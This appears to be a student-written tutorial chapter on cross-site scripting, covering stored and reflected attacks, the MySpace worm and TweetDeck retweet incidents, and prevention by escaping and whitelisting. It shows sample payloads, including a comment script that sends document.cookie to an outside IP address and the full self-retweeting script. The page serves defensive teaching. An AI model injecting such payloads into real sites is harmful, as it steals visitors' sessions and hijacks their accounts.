<frontmatter>
  title: Cross Site Scripting
  header: pagetop.md
  footer: footer.md
  head: head.md
  siteNav: mainNav.md
  pageNav: 3
</frontmatter>

<div class="website-content">

# Cross Site Scripting (XSS)
{{ booktitle | safe }}

**Authors: [Chester Sng](https://github.com/ChesterSng), [Tan Wang Leng](https://github.com/nus-oss/cs3281-website/tree/master/students/AY1617S2/tanWangLeng/TanWangLeng-Resume.md)**

Reviewers: [Bryan Lew](https://github.com/blewjy), [Jeremy Choo](https://github.com/ChooJeremy), [Heng Le](https://github.com/initialshl)

<box id="article-toc">

* [What is XSS?‎](#what-is-xss)
* [Why Do You Need to Know About XSS?‎](#why-do-you-need-to-know-about-xss)
* [How Does XSS work?‎](#how-does-xss-work)
* [Types of XSS‎](#types-of-xss)
* [Well-Known XSS Incidents‎](#well-known-xss-incidents)
* [How to Prevent XSS?‎](#how-to-prevent-xss)
* [Where to Go From Here?‎](#where-to-go-from-here)
* [Resources‎](#resources)
</box>

## What is XSS?
Cross Site Scripting (XSS) is the most exploited web application vulnerability in 2017 (based on a <a href="https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf" target="_blank">report</a> in 2018). XSS vulnerabilities have been reported and exploited since the 1990s. Prominent sites affected in the past include social-networking sites <a href="https://www.symantec.com/connect/blogs/persistent-xss-vulnerability-facebook" target="_blank">Facebook</a> and <a href="https://www.acunetix.com/blog/articles/dangerous-xss-vulnerability-found-on-youtube-the-vulnerability-explained/" target="_blank">Youtube</a>.

XSS is a type of injection, in which malicious code are injected into trusted websites. XSS flaws that allow these attacks to happen are widespread and can occur anywhere a web application uses input from a user to generate an output on the website without validating it or encoding it. 

## Why Do You Need to Know About XSS?
As software engineers, or aspiring software engineers, it is highly likely that we will build web applications. It is important to know how we can protect our web applications against XSS, so that it will not become a tool for attackers.

## How Does XSS Work?
One of the most common ways to accept inputs from users are text boxes. In this example, we will look at a website that allows users to enter their comments to blog posts. 

Here is the comments section of the website: 

> **Comments Section** <br>
That's a very nice picture! <br>
Good photograph!

However, are users limited to just typing in text? This website does not check the input, thus users are able to use formatting HTML tags, such
as `<b>` for bolding and `<i>` for italicizing.

What happens when a user submits the following as a comment?
```html
I <b>like</b> your photograph!
```

It becomes: 
> **Comments Section** <br>
That's a very nice picture! <br>
Good photograph! <br>
I **like** your photograph!

HTML also supports <tooltip content="In HTML, anything between the opening and closing script tags will run as <b>JavaScript</b>. 
">`<script>`</tooltip>, for you to write `JavaScript` code on the webpage as well. 

What happens when a malicious user submits the following as a comment?

```html
This is an innocent looking comment. <script>sendToServer("https://139.241.0.3/", document.cookie)</script>
```

It becomes: 
> **Comments Section** <br>
That's a very nice picture! <br>
Good photograph! <br>
I **like** your photograph! <br>
This is an innocent looking comment.

Visitors of the blog will only see the non-script portion of the comment. The script portion is rendered as `Javascript` just like how the `<b>` and `<i>` tags causes text to be **bolded** and *italicised* but the tags themselves are not shown. 

The script `<script>sendToServer("https://139.241.0.3/", document.cookie)</script>` will be run immediately when the visitors load the website. Here, the visitor will be unaware that his <tooltip content="A cookie is a piece of data sent from the server and stored on the client's computer. It can contain sensitive information such as login data.">cookie</tooltip> is stolen. 


Therefore, the malicious user has managed to add additional "functionalities" to the website that is not intended by the original website developer.

<box> Trivia: The term "Cross Site Scripting" is actually an old term. It originally describe an attack whereby hackers write malicious JavaScript scripts on a separate website, and injects it into the victim's website, in order to steal data from the victim's website/deface the page (hence "Cross Site"). Such attacks are no longer possible today, and the modern definition of "Cross Site Scripting" includes attacks that do not need to be on a separate website to work.</box>

## Types of XSS

There are no standard definitions, but there are at least two different types of
XSS:

* **Persistent XSS** (also known as stored XSS) - The injected `JavaScript` code gets stored in
the web server. Example: Posting a malicious `JavaScript` code into a blog post as
a comment. The comment gets stored in the server database, and when visitors visit the webpage, their web browsers will retrieve the comment from the database and run the malicious `JavaScript` code automatically.

* **Non-persistent XSS** (also known as reflected XSS) - The `JavaScript` code is
inserted in URL/links of website that accepts URL parameters as input. The input
is not stored in the server database.

    An example of a non-persistent XSS attack would be an e-card website that displays an e-card to a visitor of the website. The e-card can be customised by modifying the `content` parameter of the URL:

    `https://www.ecard.com/view-ecard.php?content=Happy%20Holidays`

    However, that also means that hackers are able to also include scripts in their e-card content. They can send this URL to victims, hoping that they will click on them, resulting in the scripts being executed:

    `https://www.ecard.com/view-ecard.php?content=Happy%20Holidays<script>...</script>`

## Well-Known XSS Incidents

**MySpace Worm**

In 2005, MySpace allowed users to customise their profiles using HTML code. This allowed for diversity of profiles but also allowed a user named Samy Kamkar to find an XSS vulnerability. 

Samy Kamkar wrote a script which made people who visited his profile send him a friend request, and list Samy’s in their own profile’s “My Heroes” section. Not only that, he also programmed the script to copy itself onto the visitor's profile. Within a day, he had 1 million friend requests. 

This caused MySpace to take the site offline to figure out what was going on and to purge the worm. 

You can read the detailed article <a href="https://motherboard.vice.com/en_us/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever" target="_blank">here</a>.

**Self-Retweeting Tweet**

In 2014, a tweet became the world's first retweeting tweet. Twitter itself has security measures against XSS and is thus unaffected. However, users on TweetDeck (Twitter social media dashboard application) that came across this tweet will automatically retweet this tweet:

```html
<script class="xss">
$('.xss').parents().eq(1).find('a').eq(1).click();
$('[data-action=retweet]').click();
alert('XSS in Tweetdeck')
</script> ♥
```

The first line selects the retweet button and then clicks it, and the second line confirms the action by clicking ok on the modal tht confirms the retweet. A TweetDeck user who saw this tweet will only see "♥", the script portion is executed by the browser on the script. Without `alert()`, the TweetDeck user will not even notice anything.

You can still see this tweet <a href="https://twitter.com/dergeruhn/status/476764918763749376?lang=en" target="_blank">here</a>.

## How to Prevent XSS?

There are a couple of ways to prevent your website against XSS. The two most
common ways are:

* **Escaping String Input** <br>
By converting legal HTML characters to their
display-equivalent (e.g. `<` to `&lt;`), you prevent the symbol from being
parsed as HTML. It now even shows the content on the screen (in case the actual
intention is to actually show someone how to code for example).
In the above example, the comment section will become like this:

    > **Comments Section** <br>
    That's a very nice picture! <br>
    Good photograph! <br>
    I **like** your photograph! <br>
    This is an innocent looking comment. `<script>sendToServer("https://139.241.0.3/", document.cookie)</script>`

    The `<script>` and `</script>` will be displayed as text rather than being run as `JavaScript` by the browser.

* **Whitelist Sanitization** <br>
By scanning and parsing the input as HTML, you can
remove undesired HTML elements, and only allowing certain whitelisted HTML
elements to be used (e.g. whitelisting only `<b>` and `<i>`).

Note that these two ways alone are not enough to protect your web application against XSS attacks. Sophisticated attacks will make use of the different possible user inputs to inject code or illegal characters that are not limited to `<script>...</script>`. It is important to note where the user input is going to be generated in the output.

For example, if you are building a profile page and allow user to add their own links to certain buttons:

`<a href="{user input link}">...</a>`

If a malicious user submits the following as input: 

`javascript:alert("XSS!")`

It will result in the button running the javascript code when pressed → <a href="javascript:alert('XSS!')"><span class="glyphicon glyphicon-user"></span></a> 

You can also consider using XSS scanning tools to check whether your web application is vulnerable. Below are links of some open-source XSS scanning tools: 

1. http://wapiti.sourceforge.net/ (Web Application Vulnerability Scanner)
1. https://w3af.org/ (Web Application Attack and Audit Framework)
1. https://www.arachni-scanner.com/ (Web Application Security Scanner Framework)

## Where to Go From Here?

Although XSS is the most common web application vulnerability, there are also many other types of vulnerabilities. It is important to be aware of them to properly secure your web application. Given below is a summary of web application vulnerabilities (for the full report see <a href="https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf" target="_blank">here</a>):

![Graphical Statistic](./Images/StatisticGraphic.png)

## Resources

References:

1. https://en.wikipedia.org/wiki/Cross-site_scripting (Overview of XSS taken from here)
1. http://projects.webappsec.org/f/WASC-TC-v2_0.pdf (page 32 & 33)
(Basic description of the XSS attack taken from here)
1. https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Stored_and_Reflected_XSS_Attacks
(Description of the two types of XSS attack taken from here)
1. https://blog.jeremiahgrossman.com/2006/07/origins-of-cross-site-scripting-xss.html
(Origin of the name "Cross Site Scripting")
1. https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Web-application-attacks-2018-eng.pdf (Statistical Summary taken from here)

Additional Reading Resources:

1. https://www.owasp.org/index.php/Testing_for_Cross_site_scripting
(How to manually test your own website for XSS attacks?)
1. https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet
(A list of possible preventions, which contains even more ways to protect your site from XSS attacks).
1. https://guides.rubyonrails.org/security.html#cross-site-scripting-xss
(In-depth discussion of how XSS attacks work, the different possible scenarios of such attacks, and possible preventive measures)
1. https://www.owasp.org/index.php/DOM_Based_XSS
(Discussion about DOM-based XSS attacks, a third possible type of XSS attacks)
1. https://excess-xss.com/
(Comprehensive coverage of *all* aspects of XSS)

</div>
